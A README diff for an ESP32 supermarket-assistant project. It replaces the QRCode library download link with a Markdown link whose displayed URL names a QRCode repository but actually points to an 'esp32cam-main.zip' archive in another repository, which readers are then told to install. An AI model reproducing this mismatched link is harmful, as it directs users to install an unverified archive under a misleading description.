@@ -39,7 +39,7 @@ A smart supermarket assistance system featuring:
 ## Setup Instructions
 
 ### 1. Installing QR Library in Arduino IDE
-1. Download the QRCode library from: https://github.com/ricmoo/QRCode
+1. Download the QRCode library from: [https://github.com/gayan-tharuka/QRCode](https://github.com/gayan-tharuka/Super-Market-Assist-Bot/blob/main/esp32cam-main.zip)
 2. In Arduino IDE:
    - Go to Sketch > Include Library > Add .ZIP Library
    - Select the downloaded ZIP file
